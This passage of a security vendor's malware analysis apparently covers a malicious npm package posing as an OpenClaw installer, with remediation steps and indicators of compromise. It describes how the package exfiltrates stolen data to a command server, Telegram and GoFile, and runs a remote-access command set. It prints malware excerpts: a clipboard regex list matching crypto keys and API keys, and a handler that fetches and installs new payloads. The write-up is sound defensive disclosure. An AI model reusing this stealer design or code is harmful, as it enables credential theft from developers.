+<li>Apple Notes (<code>NoteStore.sqlite</code> - parsed into plaintext)  </li>
+<li>iMessage history (<code>chat.db</code>)  </li>
+<li>Safari browsing history (<code>History.db</code>)  </li>
+<li>Mail account configurations (<code>Accounts.plist</code>)  </li>
+<li>Apple Account information (<code>Accounts4.sqlite</code>)</li>
+</ul>
+<p><img src="/img/RealTimePostImage/post/ghostclaw-unmasked/fda_protected_data_example_code.png"></p>
+<h3 id="exfiltration"><a href="#exfiltration" aria-hidden="true" tabindex="-1">Exfiltration</a></h3>
+<p>All collected data is compressed into a tar.gz archive named <code>[COUNTRY_CODE]username_persistentId.tar.gz</code>.</p>
+<p>The archive is exfiltrated through multiple channels for redundancy:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Channel</th>
+<th align="left">Condition</th>
+<th align="left">Method</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">C2 Panel</td>
+<td align="left">Always</td>
+<td align="left">HTTP upload to <code>hxxps[://]trackpipe[.]dev</code></td>
+</tr>
+<tr>
+<td align="left">Telegram Bot API</td>
+<td align="left">Archive \&#x3C; ~49 MB</td>
+<td align="left">Direct file upload via Bot API:multipart POST to <code>api.telegram.org/bot&#x3C;token>/sendDocument</code></td>
+</tr>
+<tr>
+<td align="left">GoFile.io</td>
+<td align="left">Archive > ~49 MB</td>
+<td align="left">The upload to <code>upload.gofile.io/uploadfile</code>  with the hardcoded bearer token.  Followed by password-locking the file via the GoFile API with the hardcoded password.</td>
+</tr>
+</tbody>
+</table>
+<p>A formatted summary report is sent to Telegram with counts of all stolen data:</p>
+<pre><code>GhostLoader Report
+[ Target ]
+  Worker:    complexarchaeologist1
+  Campaign:  @openclaw-ai/openclawai
+  User:      victim
+  Host:      MacBook-Pro.local
+  Country:   US
+[ Findings ]
+  password .. hunter2
+  pass .......... 42
+  cards ......... 3
+  autofill ..... 128
+  CDP .......... 4
+  wallets ...... 2
+  seeds ........ 1
+  ssh ............ 3
+  FDA ........... Yes (5)
+  persist ...... Yes
+  keychain ... Yes
+  browsers .. 3
+  AI agents . ZeroClaw (4), PicoClaw (2)
+</code></pre>
+<p>After exfiltration, the loot directory is cleaned up.</p>
+<h3 id="persistent-mode-rat-capabilities"><a href="#persistent-mode-rat-capabilities" aria-hidden="true" tabindex="-1">Persistent Mode: RAT Capabilities</a></h3>
+<p>On subsequent runs (when the malware detects it is running from its installed path), it enters persistent daemon mode:</p>
+<ol>
+<li><strong>PID locking.</strong> Kills any previously running instance and writes its own PID to <code>.lock</code>.  </li>
+<li><strong>Beacon registration.</strong> Sends system info to the C2 panel for registration.  </li>
+<li><strong>Telegram configuration.</strong> Fetches bot token and chat ID from the C2 panel.  </li>
+<li><strong>Starts background monitors:</strong></li>
+</ol>
+<p><strong>Clipboard monitor.</strong> Every 3 seconds, reads the system clipboard and checks it against regex patterns for sensitive data. Any match is immediately sent to Telegram and the C2 panel:</p>
+<pre><code class="language-javascript">var PATTERNS = [
+    { name: "Private Key (Hex)", regex: /\b[a-fA-F0-9]{64}\b/ },
+    { name: "WIF Key",           regex: /\b[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}\b/ },
+    { name: "SOL Private Key",  regex: /\b[1-9A-HJ-NP-Za-km-z]{87,88}\b/ },
+    { name: "RSA Private Key",  regex: /---BEGIN (?:RSA )?PRIVATE KEY---/ },
+    { name: "BTC Address",      regex: /\b(bc1[a-z0-9]{38,61}|[13][1-9A-HJ-NP-Za-km-z]{25,34})\b/ },
+    { name: "ETH Address",      regex: /\b0x[a-fA-F0-9]{40}\b/ },
+    { name: "AWS Key",          regex: /\b(AKIA|ABIA|ACCA)[0-9A-Z]{16}\b/ },
+    { name: "OpenAI Key",       regex: /\bsk-[a-zA-Z0-9]{48}\b/ },
+    { name: "Stripe Key",       regex: /\bsk_live_[0-9a-zA-Z]{24}/ }
+];
+</code></pre>
+<p>When a mnemonic seed phrase is detected in the clipboard, the alert includes the word count and BIP-39 match ratio.</p>
+<p><strong>Process monitor.</strong> Watch running processes for interesting applications.</p>
+<p><strong>iMessage monitor (macOS).</strong> Monitors the iMessage <code>chat.db</code> for new messages in real time.</p>
+<h3 id="c2-command-handling"><a href="#c2-command-handling" aria-hidden="true" tabindex="-1">C2 Command Handling</a></h3>
+<p>The malware polls the C2 panel every ~25 seconds (with 30% jitter) for commands. The <code>handleCommand()</code> function supports the following operations:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>EXEC</code></td>
+<td align="left">Execute arbitrary shell command (85s timeout), return output to C2</td>
+</tr>
+<tr>
+<td align="left"><code>OPEN</code></td>
+<td align="left">Open a URL in the victim's default browser</td>
+</tr>
+<tr>
+<td align="left"><code>UPDATE</code></td>
+<td align="left">Download new payload (AES-256-GCM encrypted), overwrite <code>monitor.js</code>, restart</td>
+</tr>
+<tr>
+<td align="left"><code>GRAB</code></td>
+<td align="left">Tar and exfiltrate an arbitrary file or directory path</td>
+</tr>
+<tr>
+<td align="left"><code>RECOLLECT</code></td>
+<td align="left">Re-run the full data collection (optionally with a new password)</td>
+</tr>
+<tr>
+<td align="left"><code>PROXY_START</code></td>
+<td align="left">Start a SOCKS5 proxy on the victim machine</td>
+</tr>
+<tr>
+<td align="left"><code>PROXY_STOP</code></td>
+<td align="left">Stop the SOCKS5 proxy</td>
+</tr>
+<tr>
+<td align="left"><code>PROXY_STATUS</code></td>
+<td align="left">Report proxy port, active connections, uptime</td>
+</tr>
+<tr>
+<td align="left"><code>CLONE_START</code></td>
+<td align="left">Clone a browser profile and launch headless with CDP, relay to C2</td>
+</tr>
+<tr>
+<td align="left"><code>CLONE_STOP</code></td>
+<td align="left">Stop the browser clone</td>
+</tr>
+<tr>
+<td align="left"><code>CLONE_STATUS</code></td>
+<td align="left">List available browsers and active clones</td>
+</tr>
+<tr>
+<td align="left"><code>NUKE</code></td>
+<td align="left">Full self-destruct</td>
+</tr>
+</tbody>
+</table>
+<p>The <code>UPDATE</code> command uses the same AES-256-GCM decryption scheme as the initial payload delivery, allowing the operator to push new versions:</p>
+<pre><code class="language-javascript">if (arg_454.type === "UPDATE") try {
+const { url: var_1634, key: var_1635 } = JSON.parse(arg_454.payload);
+    if (!var_1634 || !var_1635) throw new Error("UPDATE payload missing url or key");
+    await selfUpdate(var_1634, var_1635);
+    if ("https://trackpipe.dev") try {
+    await sendResult(arg_454.id, "Updated. Restarting.", "completed");
+    } 
+catch {}
+    restartSelf();         } catch (err_68) {
+       if ("https://trackpipe.dev") try {
+       await sendResult(arg_454.id, err_68.message, "error");
+       } catch {}
+       }
+</code></pre>
+<p>The <code>CLONE_START</code> command is particularly dangerous. It copies a full browser profile (including cookies, login data, history, and local state), launches a headless Chromium instance with <code>-remote-debugging-port</code>, and relays the CDP WebSocket back to the C2 server. This gives the attacker a fully authenticated browser session - they can browse as the victim without needing any credentials.</p>
+<p>The <code>NUKE</code> command performs complete self-destruction: kills all ghost/clone processes, removes shell hooks from all RC files, cleans cron jobs, deletes all temp files prefixed with <code>ghost_</code> or <code>clone_</code>, and recursively deletes the install directory.</p>
+<h2 id="anti-forensics"><a href="#anti-forensics" aria-hidden="true" tabindex="-1">Anti-Forensics</a></h2>
+<p>The malware employs several techniques to avoid detection and complicate analysis:</p>
+<ul>
+<li>Detached child processes with <code>stdio: "ignore"</code> and <code>process.title = "node"</code>  </li>
+<li>Temp payload file deleted after 60 seconds  </li>
+<li>Install directory disguised as <code>.npm_telemetry</code>  </li>
+<li>Shell hooks disguised as <code># NPM Telemetry Integration Service</code>  </li>
+<li>Cron entries disguised as <code># Node.js Telemetry Collection</code>  </li>
+<li>Loot directory cleaned after exfiltration  </li>
+<li>PID lock file prevents multiple instances  </li>
+<li>Crash reporting sends debug logs to Telegram, then exits  </li>
+<li>NUKE command for complete evidence destruction</li>
+</ul>
+<h2 id="remediation"><a href="#remediation" aria-hidden="true" tabindex="-1">Remediation</a></h2>
+<p>Affected users who installed this package should:</p>
+<ol>
+<li><strong>Remove persistence.</strong> Check <code>~/.zshrc</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.zshenv</code>, and <code>~/.profile</code> for lines containing <code>npm_telemetry</code> or <code>NPM Telemetry Integration Service</code>. Remove them. Check <code>crontab -l</code> for entries referencing <code>.npm_telemetry</code> and remove them.  </li>
+<li><strong>Kill running processes.</strong> Run <code>ps aux | grep monitor.js</code> and <code>ps aux | grep npm_telemetry</code> to find and kill any running instances.  </li>
+<li><strong>Delete the install directory.</strong> Remove <code>~/.cache/.npm_telemetry/</code> (macOS/Linux) or <code>%APPDATA%/.npm_telemetry/</code> (Windows).  </li>
+<li><strong>Uninstall the package.</strong> <code>npm uninstall -g @openclaw-ai/openclawai &#x26;&#x26; npm uninstall @openclaw-ai/openclawai</code>  </li>
+<li><strong>Rotate all credentials.</strong> System password, SSH keys, API tokens (AWS, GCP, Azure, OpenAI, Stripe, npm, GitHub CLI), browser saved passwords, and any crypto wallet seed phrases that may have been exposed.  </li>
+<li><strong>Revoke browser sessions.</strong> All browser cookies were exfiltrated. Sign out of all active sessions in Google, GitHub, and other services that support session management.  </li>
+<li><strong>Re-image if possible.</strong> Given the depth of access (system password, full keychain, browser sessions, SOCKS5 proxy, browser cloning), a full system re-image is strongly recommended.</li>
+</ol>
+<h2 id="conclusion"><a href="#conclusion" aria-hidden="true" tabindex="-1">Conclusion</a></h2>
+<p>The @openclaw-ai/openclawai package combines social engineering, encrypted payload delivery, broad data collection, and a persistent RAT into a single npm package. The polished fake CLI installer and Keychain prompt are convincing enough to extract system passwords from cautious developers, and once captured, those credentials unlock macOS Keychain decryption and browser credential extraction that would otherwise be blocked by OS-level protections.</p>
+<p>The persistence layer (shell hooks, cron jobs) and the UPDATE command give the operator long-term access without needing to republish the package, while the NUKE command enables clean evidence destruction.</p>
+<p>Developers should treat any npm package that requests system credentials, uses postinstall scripts to globally install itself, or fetches remote payloads at install time as suspicious. When installing OpenClaw, only use the official package from verified sources - not third-party or similarly named alternatives. Automated tools that flag these behaviors at install time remain an effective defense against this class of attack.</p>
+<p>This package is already detected by JFrog Xray and JFrog Curation.</p>
+<h2 id="indicators-of-compromise"><a href="#indicators-of-compromise" aria-hidden="true" tabindex="-1">Indicators of Compromise</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">Indicator</th>
+<th align="left">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Package Name</td>
+<td align="left"><code>@openclaw-ai/openclawai</code></td>
+</tr>
+<tr>
+<td align="left">Package Type</td>
+<td align="left"><code>NPM</code></td>
+</tr>
+<tr>
+<td align="left">Versions</td>
+<td align="left">1.5.15,1.5.14</td>
+</tr>
+<tr>
+<td align="left">XRAY-ID</td>
+<td align="left"><code>XRAY-949975</code></td>
+</tr>
+<tr>
+<td align="left">C2 Domain</td>
+<td align="left">hxxps[://]trackpipe[.]dev</td>
+</tr>
+<tr>
+<td align="left">Bootstrap Path</td>
+<td align="left"><code>/t/bootstrap?t=fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e</code></td>
+</tr>
+<tr>
+<td align="left">Campaign ID</td>
+<td align="left"><code>complexarchaeologist1</code></td>
+</tr>
+<tr>
+<td align="left">Install Directory</td>
+<td align="left"><code>~/.cache/.npm_telemetry/</code></td>
+</tr>
+<tr>
+<td align="left">Executable Name</td>
+<td align="left"><code>monitor.js</code></td>
+</tr>
+<tr>
+<td align="left">Temp File Pattern</td>
+<td align="left"><code>/tmp/sys-opt-*.js</code></td>
+</tr>
+<tr>
+<td align="left">Shell Hook Comment</td>
+<td align="left"><code># NPM Telemetry Integration Service</code></td>
+</tr>
+<tr>
+<td align="left">Cron Comment</td>
+<td align="left"><code># Node.js Telemetry Collection</code></td>
+</tr>
+<tr>
+<td align="left">Encryption</td>
+<td align="left">AES-256-GCM (16-byte IV, 16-byte auth tag)</td>
+</tr>
+<tr>
+<td align="left">Geo Lookup</td>
+<td align="left">hxxps[://]ipinfo[.]io/json</td>
+</tr>
+<tr>
+<td align="left">File Upload Fallback</td>
+<td align="left">GoFile.io API</td>
+</tr>
+<tr>
+<td align="left">Exfiltration</td>
+<td align="left">Telegram Bot API, C2 panel upload</td>
+</tr>
+<tr>
+<td align="left">Environment Variables</td>
+<td align="left"><code>NODE_AUTH_TOKEN</code>, <code>NODE_CHANNEL</code>, <code>NPM_CONFIG_TAG</code>, <code>GHOST_RECOLLECT</code>, <code>GHOST_TG_CONFIG</code></td>
+</tr>
+</tbody>
+</table>
+</section><!----></div></div></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script src="/assets/js/app.6d2efe46.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
